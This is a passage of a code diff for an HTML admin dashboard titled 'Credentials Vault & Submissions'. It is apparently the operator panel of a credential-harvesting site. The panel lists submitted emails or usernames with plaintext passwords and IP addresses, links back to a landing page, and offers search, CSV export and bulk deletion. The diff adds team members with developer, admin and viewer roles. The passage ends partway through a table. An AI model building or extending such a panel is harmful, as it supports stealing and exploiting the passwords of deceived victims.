@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Database Management Dashboard</title>
+    <meta name="description" content="Secure role-based admin dashboard for managing credential submissions.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
@@ -23,14 +25,10 @@
             --text-main: #f3f4f6;
             --text-muted: #9ca3af;
             --gold: #f59e0b;
+            --purple: #a855f7;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
 
         body {
             background-color: var(--bg-primary);
@@ -38,12 +36,13 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            background-image: 
+            background-image:
                 radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
                 radial-gradient(at 100% 100%, rgba(245, 158, 11, 0.08) 0px, transparent 50%);
             background-attachment: fixed;
         }
 
+        /* ── Navbar ── */
         .navbar {
             display: flex;
             justify-content: space-between;
@@ -55,13 +54,11 @@
             position: sticky;
             top: 0;
             z-index: 100;
+            gap: 16px;
+            flex-wrap: wrap;
         }
 
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+        .brand { display: flex; align-items: center; gap: 12px; }
 
         .brand-badge {
             background: linear-gradient(135deg, #f59e0b, #ef4444);
@@ -73,19 +70,32 @@
             font-size: 14px;
         }
 
-        .brand h1 {
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            color: #fff;
-        }
+        .brand h1 { font-size: 18px; font-weight: 700; letter-spacing: 0.5px; color: #fff; }
 
-        .nav-actions {
+        .nav-tabs {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 4px;
         }
 
+        .nav-tab {
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+            background: transparent;
+            color: var(--text-muted);
+        }
+
+        .nav-tab:hover { background: rgba(255,255,255,0.06); color: var(--text-main); }
+        .nav-tab.active { background: rgba(59,130,246,0.15); border-color: rgba(59,130,246,0.4); color: #60a5fa; }
+
+        .nav-actions { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+
+        /* ── Buttons ── */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -99,52 +109,26 @@
             text-decoration: none;
             border: 1px solid transparent;
         }
+        .btn-primary { background: var(--accent); color: #fff; box-shadow: 0 0 15px var(--accent-glow); }
+        .btn-primary:hover { background: var(--accent-hover); transform: translateY(-1px); }
+        .btn-outline { background: rgba(255,255,255,0.05); color: var(--text-main); border: 1px solid var(--border); }
+        .btn-outline:hover { background: rgba(255,255,255,0.1); border-color: var(--border-hover); }
+        .btn-danger { background: rgba(239,68,68,0.15); color: #fca5a5; border: 1px solid rgba(239,68,68,0.3); }
+        .btn-danger:hover { background: var(--danger); color: #fff; }
+        .btn-success { background: rgba(16,185,129,0.15); color: #6ee7b7; border: 1px solid rgba(16,185,129,0.3); }
+        .btn-success:hover { background: var(--success); color: #fff; }
+        .btn-purple { background: rgba(168,85,247,0.15); color: #d8b4fe; border: 1px solid rgba(168,85,247,0.3); }
+        .btn-purple:hover { background: var(--purple); color: #fff; }
 
-        .btn-primary {
-            background: var(--accent);
-            color: #fff;
-            box-shadow: 0 0 15px var(--accent-glow);
-        }
-        .btn-primary:hover {
-            background: var(--accent-hover);
-            transform: translateY(-1px);
-        }
+        /* ── Main layout ── */
+        .main-container { max-width: 1280px; width: 100%; margin: 0 auto; padding: 32px 24px; flex: 1; }
 
-        .btn-outline {
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--text-main);
-            border: 1px solid var(--border);
-        }
-        .btn-outline:hover {
-            background: rgba(255, 255, 255, 0.1);
-            border-color: var(--border-hover);
-        }
+        /* ── Tab Panels ── */
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; }
 
-        .btn-danger {
-            background: rgba(239, 68, 68, 0.15);
-            color: #fca5a5;
-            border: 1px solid rgba(239, 68, 68, 0.3);
-        }
-        .btn-danger:hover {
-            background: var(--danger);
-            color: #fff;
-        }
-
-        .main-container {
-            max-width: 1280px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 32px 24px;
-            flex: 1;
-        }
-
-        /* Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 18px;
-            margin-bottom: 28px;
-        }
+        /* ── Stats Grid ── */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 18px; margin-bottom: 28px; }
 
         .stat-card {
             background: var(--bg-card);
@@ -156,35 +140,15 @@
             overflow: hidden;
         }
 
-        .stat-card::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 4px;
-            height: 100%;
-            background: var(--accent);
-        }
-
+        .stat-card::after { content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--accent); }
         .stat-card.gold::after { background: var(--gold); }
         .stat-card.green::after { background: var(--success); }
+        .stat-card.purple::after { background: var(--purple); }
 
-        .stat-label {
-            font-size: 12px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            color: var(--text-muted);
-            margin-bottom: 6px;
-        }
+        .stat-label { font-size: 12px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 6px; }
+        .stat-value { font-size: 26px; font-weight: 700; color: #fff; }
 
-        .stat-value {
-            font-size: 26px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        /* Controls Section */
+        /* ── Toolbar ── */
         .toolbar {
             display: flex;
             flex-wrap: wrap;
@@ -198,332 +162,156 @@
             padding: 16px 20px;
         }
 
-        .search-box {
-            position: relative;
-            flex: 1;
-            min-width: 250px;
-            max-width: 400px;
-        }
-
+        .search-box { position: relative; flex: 1; min-width: 250px; max-width: 400px; }
         .search-box input {
-            width: 100%;
-            padding: 10px 14px 10px 38px;
-            background: rgba(11, 15, 25, 0.8);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 13px;
-            outline: none;
-            transition: border-color 0.2s;
+            width: 100%; padding: 10px 14px 10px 38px;
+            background: rgba(11,15,25,0.8); border: 1px solid var(--border);
+            border-radius: 8px; color: #fff; font-size: 13px; outline: none; transition: border-color 0.2s;
         }
-        .search-box input:focus {
-            border-color: var(--accent);
-        }
+        .search-box input:focus { border-color: var(--accent); }
+        .search-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--text-muted); font-size: 14px; }
+        .toolbar-actions { display: flex; gap: 10px; flex-wrap: wrap; }
 
-        .search-icon {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-muted);
-            font-size: 14px;
-        }
+        /* ── Table ── */
+        .table-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
+        .table-responsive { overflow-x: auto; width: 100%; }
 
-        .toolbar-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
+        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; }
+        th { background: rgba(11,15,25,0.95); color: var(--text-muted); font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.7px; padding: 14px 18px; border-bottom: 1px solid var(--border); white-space: nowrap; }
+        td { padding: 14px 18px; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle; }
+        tr:hover td { background: rgba(255,255,255,0.02); }
 
-        /* Table Card */
-        .table-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .table-responsive {
-            overflow-x: auto;
-            width: 100%;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: left;
-            font-size: 13px;
-        }
-
-        th {
-            background: rgba(11, 15, 25, 0.95);
-            color: var(--text-muted);
-            font-weight: 600;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.7px;
-            padding: 14px 18px;
-            border-bottom: 1px solid var(--border);
-            white-space: nowrap;
-        }
-
-        td {
-            padding: 14px 18px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            vertical-align: middle;
-        }
-
-        tr:hover td {
-            background: rgba(255, 255, 255, 0.02);
-        }
-
-        .mono {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-        }
-
-        .user-cell {
-            font-weight: 600;
-            color: #60a5fa;
-        }
+        .mono { font-family: 'JetBrains Mono', monospace; font-size: 12px; }
+        .user-cell { font-weight: 600; color: #60a5fa; }
 
         .password-badge {
-            background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 4px 8px;
-            border-radius: 6px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+            background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.1);
+            padding: 4px 8px; border-radius: 6px; display: inline-flex; align-items: center; gap: 8px;
         }
 
-        .copy-btn {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            cursor: pointer;
-            font-size: 12px;
-            transition: color 0.15s;
-        }
-        .copy-btn:hover {
-            color: #fff;
-        }
+        .copy-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 12px; transition: color 0.15s; }
+        .copy-btn:hover { color: #fff; }
+        .date-cell { color: var(--text-muted); white-space: nowrap; }
 
-        .date-cell {
-            color: var(--text-muted);
-            white-space: nowrap;
-        }
+        .ip-badge { background: rgba(245,158,11,0.12); color: #fbbf24; padding: 3px 8px; border-radius: 5px; font-size: 11px; }
 
-        .ip-badge {
-            background: rgba(245, 158, 11, 0.12);
-            color: #fbbf24;
-            padding: 3px 8px;
-            border-radius: 5px;
-            font-size: 11px;
-        }
+        .empty-state { text-align: center; padding: 60px 20px; color: var(--text-muted); }
+        .empty-state h3 { font-size: 16px; margin-bottom: 8px; color: #fff; }
 
-        .empty-state {
-            text-align: center;
-            padding: 60px 20px;
-            color: var(--text-muted);
-        }
-        .empty-state h3 {
-            font-size: 16px;
-            margin-bottom: 8px;
-            color: #fff;
-        }
+        .action-del { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); color: #f87171; padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: all 0.2s; }
+        .action-del:hover { background: var(--danger); color: #fff; }
+        .action-edit { background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.2); color: #93c5fd; padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: all 0.2s; margin-right: 6px; }
+        .action-edit:hover { background: var(--accent); color: #fff; }
 
-        .action-del {
-            background: rgba(239, 68, 68, 0.1);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            color: #f87171;
-            padding: 5px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 11px;
-            font-weight: 600;
-            transition: all 0.2s;
-        }
-        .action-del:hover {
-            background: var(--danger);
-            color: #fff;
-        }
+        /* ── Role Badges ── */
+        .role-badge { display: inline-flex; align-items: center; gap: 5px; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .role-developer { background: rgba(168,85,247,0.18); color: #d8b4fe; border: 1px solid rgba(168,85,247,0.4); }
+        .role-admin { background: rgba(59,130,246,0.18); color: #93c5fd; border: 1px solid rgba(59,130,246,0.4); }
+        .role-viewer { background: rgba(16,185,129,0.15); color: #6ee7b7; border: 1px solid rgba(16,185,129,0.35); }
 
-        .live-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #10b981;
-            border-radius: 50%;
-            margin-right: 6px;
-            box-shadow: 0 0 8px #10b981;
-            animation: pulse 2s infinite;
-        }
+        /* ── Live indicator ── */
+        .live-indicator { display: inline-block; width: 8px; height: 8px; background: #10b981; border-radius: 50%; margin-right: 6px; box-shadow: 0 0 8px #10b981; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
+        /* ── Member badge (navbar) ── */
+        .member-badge { background: rgba(16,185,129,0.15); color: #10b981; border: 1px solid rgba(16,185,129,0.35); padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
 
-        .toast {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            background: #1f2937;
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            font-size: 13px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            display: none;
-            z-index: 1000;
-        }
+        /* ── Toast ── */
+        .toast { position: fixed; bottom: 24px; right: 24px; background: #1f2937; color: #fff; padding: 12px 20px; border-radius: 8px; border: 1px solid var(--border); font-size: 13px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); display: none; z-index: 2000; }
 
-        /* Admin Login Gate */
+        /* ── Login Gate ── */
         .login-gate-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(11, 15, 25, 0.96);
+            position: fixed; inset: 0;
+            background: rgba(11,15,25,0.96);
             backdrop-filter: blur(18px);
             -webkit-backdrop-filter: blur(18px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            padding: 20px;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 9999; padding: 20px;
         }
 
         .login-gate-card {
             background: linear-gradient(145deg, #151c2e, #0e1322);
-            border: 1px solid rgba(245, 158, 11, 0.4);
-            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95), 0 0 45px rgba(245, 158, 11, 0.18);
-            border-radius: 16px;
-            width: 100%;
-            max-width: 420px;
-            padding: 38px 32px 34px;
-            text-align: center;
-            color: #fff;
+            border: 1px solid rgba(245,158,11,0.4);
+            box-shadow: 0 25px 70px rgba(0,0,0,0.95), 0 0 45px rgba(245,158,11,0.18);
+            border-radius: 16px; width: 100%; max-width: 420px;
+            padding: 38px 32px 34px; text-align: center; color: #fff;
         }
 
-        .login-gate-badge {
-            display: inline-block;
-            padding: 4px 14px;
-            background: rgba(245, 158, 11, 0.14);
-            border: 1px solid rgba(245, 158, 11, 0.45);
-            border-radius: 20px;
-            color: #f59e0b;
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 14px;
-            text-transform: uppercase;
-        }
+        .login-gate-badge { display: inline-block; padding: 4px 14px; background: rgba(245,158,11,0.14); border: 1px solid rgba(245,158,11,0.45); border-radius: 20px; color: #f59e0b; font-size: 11px; font-weight: 700; letter-spacing: 1px; margin-bottom: 14px; text-transform: uppercase; }
+        .login-gate-card h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; color: #fff; }
+        .login-gate-card p { font-size: 13px; color: #9ca3af; margin-bottom: 24px; line-height: 1.5; }
 
-        .login-gate-card h2 {
-            font-size: 22px;
-            font-weight: 800;
-            margin-bottom: 8px;
-            color: #fff;
-        }
+        .gate-input-group { margin-bottom: 18px; text-align: left; }
+        .gate-input-group label { display: block; font-size: 12px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; }
+        .gate-input-group input { width: 100%; height: 46px; padding: 0 14px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.12); border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+        .gate-input-group input:focus { border-color: #f59e0b; box-shadow: 0 0 12px rgba(245,158,11,0.3); }
 
-        .login-gate-card p {
-            font-size: 13px;
-            color: #9ca3af;
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
+        .gate-submit-btn { width: 100%; height: 48px; background: linear-gradient(135deg, #f59e0b, #d97706); color: #0b0f19; font-size: 14px; font-weight: 800; letter-spacing: 1px; border: none; border-radius: 8px; cursor: pointer; transition: transform 0.2s, filter 0.2s; margin-top: 6px; }
+        .gate-submit-btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+        .gate-error { color: #ef4444; font-size: 12px; font-weight: 600; margin-top: 14px; min-height: 18px; }
 
-        .gate-input-group {
-            margin-bottom: 18px;
-            text-align: left;
+        /* ── Modal ── */
+        .modal-overlay {
+            position: fixed; inset: 0;
+            background: rgba(11,15,25,0.85);
+            backdrop-filter: blur(10px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 5000; padding: 20px;
+            opacity: 0; pointer-events: none; transition: opacity 0.25s;
         }
+        .modal-overlay.open { opacity: 1; pointer-events: all; }
 
-        .gate-input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #cbd5e1;
-            margin-bottom: 6px;
+        .modal-card {
+            background: linear-gradient(145deg, #151c2e, #0e1322);
+            border: 1px solid rgba(168,85,247,0.35);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 30px rgba(168,85,247,0.12);
+            border-radius: 16px; width: 100%; max-width: 480px;
+            padding: 36px 32px 30px; color: #fff;
+            transform: translateY(20px); transition: transform 0.25s;
         }
+        .modal-overlay.open .modal-card { transform: translateY(0); }
 
-        .gate-input-group input {
-            width: 100%;
-            height: 46px;
-            padding: 0 14px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
+        .modal-header h3 { font-size: 20px; font-weight: 800; }
+        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 22px; cursor: pointer; line-height: 1; padding: 4px; }
+        .modal-close:hover { color: #fff; }
 
-        .gate-input-group input:focus {
-            border-color: #f59e0b;
-            box-shadow: 0 0 12px rgba(245, 158, 11, 0.3);
+        .modal-input-group { margin-bottom: 18px; }
+        .modal-input-group label { display: block; font-size: 12px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; }
+        .modal-input-group input,
+        .modal-input-group select {
+            width: 100%; height: 44px; padding: 0 14px;
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 8px; color: #fff; font-size: 14px; outline: none;
+            transition: border-color 0.2s; appearance: none;
         }
+        .modal-input-group input:focus, .modal-input-group select:focus { border-color: var(--purple); box-shadow: 0 0 10px rgba(168,85,247,0.25); }
+        .modal-input-group select option { background: #1a2035; }
 
-        .gate-submit-btn {
-            width: 100%;
-            height: 48px;
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            color: #0b0f19;
-            font-size: 14px;
-            font-weight: 800;
-            letter-spacing: 1px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: transform 0.2s, filter 0.2s;
-            margin-top: 6px;
-        }
+        .modal-footer { display: flex; gap: 12px; justify-content: flex-end; margin-top: 28px; }
 
-        .gate-submit-btn:hover {
-            filter: brightness(1.1);
-            transform: translateY(-1px);
-        }
-
-        .gate-error {
-            color: #ef4444;
-            font-size: 12px;
-            font-weight: 600;
-            margin-top: 14px;
-            min-height: 18px;
-        }
-
-        .member-badge {
-            background: rgba(16, 185, 129, 0.15);
-            color: #10b981;
-            border: 1px solid rgba(16, 185, 129, 0.35);
-            padding: 6px 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
+        /* ── Members section header ── */
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .section-header h2 { font-size: 20px; font-weight: 700; }
+        .section-header p { font-size: 13px; color: var(--text-muted); margin-top: 4px; }
     </style>
 </head>
+
 <body>
 
-    <!-- Admin Authentication Gate (Restricted to 3 Authorized Members) -->
+    <!-- ═══ Admin Authentication Gate ═══ -->
     <div class="login-gate-overlay" id="adminLoginGate">
         <div class="login-gate-card">
-            <span class="login-gate-badge">🔒 RESTRICTED PORTAL (3 MEMBERS ONLY)</span>
+            <span class="login-gate-badge">🔒 SECURE ADMIN PORTAL</span>
             <h2>Admin Authorization</h2>
-            <p>Access is restricted strictly to the 3 authorized admin members. Enter your credentials to view the database.</p>
+            <p>Enter your credentials to access the dashboard. Access level depends on your assigned role.</p>
             <form id="adminLoginForm" onsubmit="handleAdminLogin(event)">
                 <div class="gate-input-group">
-                    <label for="adminUsername">Admin Member Username</label>
-                    <input type="text" id="adminUsername" placeholder="e.g. admin1" autocomplete="username" required autofocus>
+                    <label for="adminUsername">Username</label>
+                    <input type="text" id="adminUsername" placeholder="e.g. developer" autocomplete="username" required autofocus>
                 </div>
                 <div class="gate-input-group">
-                    <label for="adminPassword">Admin Password</label>
+                    <label for="adminPassword">Password</label>
                     <input type="password" id="adminPassword" placeholder="••••••••" autocomplete="current-password" required>
                 </div>
                 <button type="submit" class="gate-submit-btn" id="gateSubmitBtn">AUTHENTICATE</button>
@@ -532,108 +320,273 @@
         </div>
     </div>
 
+    <!-- ═══ Add / Edit Member Modal ═══ -->
+    <div class="modal-overlay" id="memberModal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3 id="modalTitle">➕ Add New Member</h3>
+                <button class="modal-close" onclick="closeMemberModal()">×</button>
+            </div>
+            <div class="modal-input-group">
+                <label for="modalName">Full Name</label>
+                <input type="text" id="modalName" placeholder="e.g. Jane Doe">
+            </div>
+            <div class="modal-input-group">
+                <label for="modalUsername">Username</label>
+                <input type="text" id="modalUsername" placeholder="e.g. jane_doe">
+            </div>
+            <div class="modal-input-group">
+                <label for="modalPassword" id="modalPasswordLabel">Password</label>
+                <input type="text" id="modalPassword" placeholder="Leave blank to keep existing password">
+            </div>
+            <div class="modal-input-group">
+                <label for="modalRole">Role</label>
+                <select id="modalRole">
+                    <option value="viewer">👁️ Viewer — Read-only access</option>
+                    <option value="admin">🔵 Admin — View + Export</option>
+                    <option value="developer">🟣 Developer — Full access</option>
+                </select>
+            </div>
+            <div id="modalError" style="color:#ef4444;font-size:12px;font-weight:600;min-height:18px;margin-top:4px;"></div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeMemberModal()">Cancel</button>
+                <button class="btn btn-purple" id="modalSaveBtn" onclick="saveMember()">Save Member</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══ Navbar ═══ -->
     <header class="navbar">
         <div class="brand">
             <div class="brand-badge">SQLITE DB</div>
-            <h1>Credentials Vault & Submissions</h1>
+            <h1>Credentials Vault &amp; Submissions</h1>
         </div>
+
+        <!-- Tab Navigation -->
+        <nav class="nav-tabs" id="navTabs">
+            <button class="nav-tab active" id="tabSubmissions" onclick="switchTab('submissions')">📊 Submissions</button>
+            <button class="nav-tab" id="tabMembers" onclick="switchTab('members')" style="display:none;">👥 Members</button>
+        </nav>
+
         <div class="nav-actions">
             <div id="adminMemberBadge" class="member-badge" style="display: none;">
-                <span class="live-indicator"></span> <span id="adminMemberName">Member</span>
+                <span class="live-indicator"></span>
+                <span id="adminMemberName">Member</span>
+                <span id="adminRoleBadge" class="role-badge" style="margin-left:4px;"></span>
             </div>
-            <a href="/" class="btn btn-outline" target="_blank">↗ View Landing Page</a>
+            <a href="/" class="btn btn-outline" target="_blank">↗ View Site</a>
             <button class="btn btn-primary" onclick="fetchSubmissions()">🔄 Refresh</button>
             <button class="btn btn-outline" id="logoutBtn" onclick="adminLogout()" style="display: none; border-color: rgba(239,68,68,0.4); color: #ef4444;">🚪 Logout</button>
         </div>
     </header>
 
+    <!-- ═══ Main Container ═══ -->
     <main class="main-container">
-        <!-- Stats Row -->
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">Total Submissions</div>
-                <div class="stat-value" id="totalCount">0</div>
-            </div>
-            <div class="stat-card gold">
-                <div class="stat-label">Database Status</div>
-                <div class="stat-value" style="font-size: 18px; display: flex; align-items: center;">
-                    <span class="live-indicator"></span> Active & Connected
+
+        <!-- ─── Submissions Tab ─── -->
+        <div class="tab-panel active" id="panelSubmissions">
+            <!-- Stats Row -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Total Submissions</div>
+                    <div class="stat-value" id="totalCount">0</div>
+                </div>
+                <div class="stat-card gold">
+                    <div class="stat-label">Database Status</div>
+                    <div class="stat-value" style="font-size: 18px; display: flex; align-items: center;">
+                        <span class="live-indicator"></span> Active &amp; Connected
+                    </div>
+                </div>
+                <div class="stat-card green">
+                    <div class="stat-label">Storage Engine</div>
+                    <div class="stat-value" style="font-size: 18px;">SQLite 3 (Local)</div>
+                </div>
+                <div class="stat-card purple" id="roleStatCard">
+                    <div class="stat-label">Your Access Level</div>
+                    <div class="stat-value" id="roleStatValue" style="font-size: 18px;">—</div>
                 </div>
             </div>
-            <div class="stat-card green">
-                <div class="stat-label">Storage Engine</div>
-                <div class="stat-value" style="font-size: 18px;">SQLite 3 (Local)</div>
+
+            <!-- Filter & Actions Toolbar -->
+            <div class="toolbar">
+                <div class="search-box">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" id="searchInput" placeholder="Search by email, password, IP..." onkeyup="filterSubmissions()">
+                </div>
+                <div class="toolbar-actions">
+                    <a href="#" id="exportCsvBtn" onclick="exportCsv(event)" class="btn btn-outline" style="display:none;">📥 Export to CSV</a>
+                    <button class="btn btn-danger" id="clearAllBtn" onclick="clearAllData()" style="display:none;">🗑️ Clear All Entries</button>
+                </div>
+            </div>
+
+            <!-- Data Table -->
+            <div class="table-card">
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th># ID</th>
+                                <th>Email / Username</th>
+                                <th>Password</th>
+                                <th>IP Address</th>
+                                <th>Date &amp; Time</th>
+                                <th id="actionsColHeader">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="submissionsTableBody">
+                            <tr>
+                                <td colspan="6" class="empty-state">
+                                    <h3>Loading submissions from database...</h3>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
 
-        <!-- Filter & Actions Toolbar -->
-        <div class="toolbar">
-            <div class="search-box">
-                <span class="search-icon">🔍</span>
-                <input type="text" id="searchInput" placeholder="Search by email, password, IP..." onkeyup="filterSubmissions()">
+        <!-- ─── Members Tab ─── -->
+        <div class="tab-panel" id="panelMembers">
+            <div class="section-header">
+                <div>
+                    <h2>👥 Team Members</h2>
+                    <p>Manage who has access to this admin panel and what they can do.</p>
+                </div>
+                <button class="btn btn-purple" onclick="openAddMemberModal()">➕ Add Member</button>
             </div>
-            <div class="toolbar-actions">
-                <a href="#" onclick="exportCsv(event)" class="btn btn-outline">📥 Export to CSV</a>
-                <button class="btn btn-danger" onclick="clearAllData()">🗑️ Clear All Entries</button>
+
+            <!-- Members Stats -->
+            <div class="stats-grid" style="margin-bottom:24px;">
+                <div class="stat-card purple">
+                    <div class="stat-label">Total Members</div>
+                    <div class="stat-value" id="membersTotalCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Developers</div>
+                    <div class="stat-value" id="membersDevCount">0</div>
+                </div>
+                <div class="stat-card gold">
+                    <div class="stat-label">Admins</div>
+                    <div class="stat-value" id="membersAdminCount">0</div>
+                </div>
+                <div class="stat-card green">
+                    <div class="stat-label">Viewers</div>
+                    <div class="stat-value" id="membersViewerCount">0</div>
+                </div>
+            </div>
+
+            <!-- Members Table -->
+            <div class="table-card">
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th># ID</th>
+                                <th>Name</th>
+                                <th>Username</th>
+                                <th>Role</th>
+                                <th>Created By</th>
+                                <th>Joined</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="membersTableBody">
+                            <tr><td colspan="7" class="empty-state"><h3>Loading members...</h3></td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Permission matrix reference -->
+            <div class="table-card" style="margin-top:24px;">
+                <div style="padding:20px 24px; border-bottom:1px solid var(--border);">
+                    <h3 style="font-size:15px;font-weight:700;">🔐 Permissions Matrix</h3>
+                </div>
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Permission</th>
+                                <th>🟣 Developer</th>
+                                <th>🔵 Admin</th>
+                                <th>🟢 Viewer</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>View Submissions</td><td>✅</td><td>✅</td><td>✅</td></tr>
+                            <tr><td>Search &amp; Filter</td><td>✅</td><td>✅</td><td>✅</td></tr>
+                            <tr><td>Export CSV</td><td>✅</td><td>✅</td><td>❌</td></tr>
+                            <tr><td>Delete Single Entry</td><td>✅</td><td>❌</td><td>❌</td></tr>
+                            <tr><td>Clear All Entries</td><td>✅</td><td>❌</td><td>❌</td></tr>
+                            <tr><td>Manage Members</td><td>✅</td><td>❌</td><td>❌</td></tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
 
-        <!-- Data Table -->
-        <div class="table-card">
-            <div class="table-responsive">
-                <table>
-                    <thead>
-                        <tr>
-                            <th># ID</th>
